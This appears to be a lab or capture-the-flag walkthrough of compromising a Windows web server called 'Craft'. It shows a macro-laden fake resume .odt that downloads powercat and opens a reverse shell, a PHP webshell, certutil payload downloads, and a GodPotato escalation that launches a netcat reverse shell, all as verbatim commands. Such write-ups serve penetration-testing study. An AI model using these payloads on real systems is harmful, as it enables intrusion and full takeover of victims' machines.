Nmap scan
```sh
nmap -p- --min-rate 5000 -T4 -Pn 192.168.203.169

Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-16 21:28 IST
Nmap scan report for 192.168.203.169
Host is up (0.088s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 26.67 seconds
```

```sh
 nmap -sC -sV -T4 -Pn -p 80 192.168.203.169      

Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-16 21:29 IST
Nmap scan report for 192.168.203.169
Host is up (0.14s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
|_http-title: Craft

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.76 seconds
```

Visiting web server on port 80.
![](Images/Craft1.png)

Directory brute forcing.
![](Images/Craft9.png)
At the bottom there are physical and email addresses.
![](Images/Craft4.png)
Most importantly we find upload capability. The company is accepting resumes. This must be our way in.
![](Images/Craft5.png)

Visiting directory /uploads.
![](Images/Craft2.png)

I’m always excited to see an uploads directory. I’ll keep that in mind as I test the upload functionality. First I create a dummy file.
![](Images/Craft3.png)
Uploaded the test.txt and we got the error. The error message tells is it needs to be an ODT file. I have not heard of that so I check.
![](Images/Craft4.png)
There’s a `/uploads` directory that we can access. Well, we can try to bypass the upload filter and upload a PHP reverse shell using burp suite.

Changing the content type doesn’t work.
![](Images/Craft7.png)
Adding “.odt” to the end works. Let’s try using NULL bytes to remove the “.odt”.
![](Images/Craft8.png)
Didn’t work.

Hmm… Let’s search for an ODT reverse shell instead. There’s a Metasploit module for this, but I prefer not to use Metasploit.
https://www.exploit-db.com/exploits/46727?source=post_page-----4b86a013924d---------------------------------------
It’s CVE-2018–16858. We just need to create a malicious macro in the .odt documents.
 Instead I’m going to try to work with ODT. I have worked with Microsoft Office to create documents with malicious macros. I’m confident we can do that here as well.

LibreOffice is easy to install if you do not have it. This software is all-around useful so you likely have this already but if not.
```sh
sudo apt install libreoffice
```
Next we are going to create a fake resume. Open a new document.
![](Images/Craft10.png)
Go to Tools → Macros → Organize Macros → Basic
![](Images/Craft11.png)

Select your document, then New, and give it a name.
![](Images/Craft12.png)

This will open up a work space. We will embed the following command in our macro. This will simply call back to our machine. It’s a test.
```sh
Shell("cmd /c powershell iwr http://192.168.45.205/")
```
![](Images/Craft13.png)
Then go back to the document (Dork-resume), select Tools and Customize.
![](Images/Craft14.png)
Select Open Document then Assign Macro…
![](Images/Craft15.png)
Select the Macro (Evil) that we created for our document and OK.
![](Images/Craft16.png)
Note that the macro is now assigned to the action.
![](Images/Craft17.png)
Close it by selecting OK again and save the document (Dork-resume)
![](Images/Craft18.png)
![](Images/Craft19.png)
Now we set up a netcat listener on port 80. This will tell us if our macro works.
Go back to the web page and upload the newly created resume.
![](Images/Craft20.png)

![](Images/Craft21.png)
We check our listener and after about 10 seconds we get a connection.
![](Images/Craft22.png)
Now it’s time to really weaponize it. Be sure to Remove the the old macro before assigning the new one.
![](Images/Craft23.png)
Then alter the macro with a command that will give us a reverse shell. We are going to use the wonderful powershell version of netcat called powercat. The command will reach back to our server for powercat and then execute it. The first part of the command (IEX…) loads powercat into memory and the second part (after the semi-colon) executes the newly loaded program. This is especially powerful because **the powercat file never touches the disk.**
```ps
Shell("cmd /c powershell IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.45.205/powercat.ps1');powercat -c 192.168.45.205 -p 135 -e powershell")
```
The go back Tools → Customize and re-Assign the (Evil) macro.
![](Images/Craft24.png)
After everything is saved again, cancel your previous listener and set up a python web sever to host powercat
```sh
python -m http.server 80
```
Upload your revise resume. We see evidence the first command executed as shown by the retrieval of powercat from our machine
![](Images/Craft25.png)
Before uploading newly created .odt file download powercat.ps1 in the same folder where we starting python server. Both .ps1 and .odt file must be in same folder.
https://github.com/besimorhino/powercat/blob/master/powercat.ps1
![](Images/Craft26.png)

![](Images/Craft28.png)
Then we check our listener.
![](Images/Craft29.png)
Captured local flag.
![](Images/Craft30.png)

### Privilege Escalation
Now that we are on the box, let’s look around a little.
![](Images/Craft31.png)
We see that there is another, likely better, user. Apache is a service after all.
![](Images/Craft32.png)
Looking at the root directory, the first things I try to identify are items that are not default. In this case, java, Windows10Upgrade, xampp, and output.txt should all be investigated.
![](Images/Craft33.png)

Before I really pick at these items, I like to get a read of the environment from Winpeas. Let’s put it on the box.
```PS
certutil -urlcache -split -f http://192.168.45.164/winPEASany.exe winPEASany.exe
OR
iwr http://192.168.45.164/winPEASany.exe -outfile winPEASany.exe
```

![](Images/Craft34.png)

Run it. I copy the interesting sections to my notes.
![](Images/Craft35.png)
![](Images/Craft36.png)
This is again suggesting to me that we should attempt a lateral escalation to the apache user since they are currently logged in. They likely have service level permissions (i.e. SeImpersonatePrivilege).
![](Images/Craft37.png)
Apache comes up again along with a generically named service. Could be useful if we can get the ability to stop/start services and can replace the service binary.
![](Images/Craft38.png)
This directory really sticks out from our exploration of the root directory earlier. Okay let’s return to the root directory and check it out. In doing so, I realize I have writable access to C:\xampp\htdocs
![](Images/Craft39.png)
This is the root of the web server! There’s our index and upload PHP files. That means this directory is browsable from the outside. Good to know. Let’s create a PHP webshell and verify that PHP execution is performed by apache.

I return to Kali to create the basic web shell.
```sh
<?php system($_GET['cmd']); ?>
```

![](Images/Craft40.png)
We can then transfer it to the victim machine.
```PS
certutil -urlcache -split -f http://192.168.45.164/cmd.php cmd.php
```
![](Images/Craft41.png)
![](Images/Craft42.png)
Now we are able to browse to it and take advantage of the code.
![](Images/Craft43.png)
Tada! Well in that case, I’m going to put a complete PHP reverse shell in the HTML root directory as well. I like to use this one for Windows machines:
![](Images/Craft44.png)
![](Images/Craft45.png)
Pull it over to the victim and set up a listener on your chosen port.
![](Images/Craft46.png)
![](Images/Craft47.png)
Browse to it like before.
![](Images/Craft48.png)
Check you listener.
![](Images/Craft49.png)
That’s what we were hoping for. This is a prime set up for the GodPotato escalation path.
https://github.com/BeichenDream/GodPotato/releases?source=post_page-----4a62baf140cc---------------------------------------
First we need to know the >NET framework version.
```cmd
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP"
```
![](Images/Craft50.png)
Then we move the exploit on ==the== box.
```cmd
certutil -urlcache -split -f http://192.168.45.164/GodPotato-NET4.exe
```
![](Images/Craft51.png)
Now we test it with something simple.
```cmd
.\GodPotato-NET4.exe -cmd "whoami"
```
![](Images/Craft52.png)

It works! The end is in sight, we only have to turn this into another reverse shell.

I like to stick with simple programs that work consistently so I’m going to grab the version of netcat.

```cmd
certutil -urlcache -split -f http://192.168.45.164/nc.exe nc.exe
```

![](Images/Craft53.png)

Now we will replace a reverse shell payload with the “whoami”, but first I like to test the payload _on its own_ before I run it through GodPotato.

```cmd
.\nc.exe 192.168.45.164 6666  -e c:\windows\system32\cmd.exe
```

![](Images/Craft54.png)

It works, so all together the payload command is:

```cmd
.\GodPotato-NET4.exe -cmd ".\nc.exe 192.168.45.164 6666  -e c:\windows\system32\cmd.exe"
```

![](Images/Craft55.png)

Going back to the listener to see the connection.

![](Images/Craft56.png)

![](Images/Craft57.png)
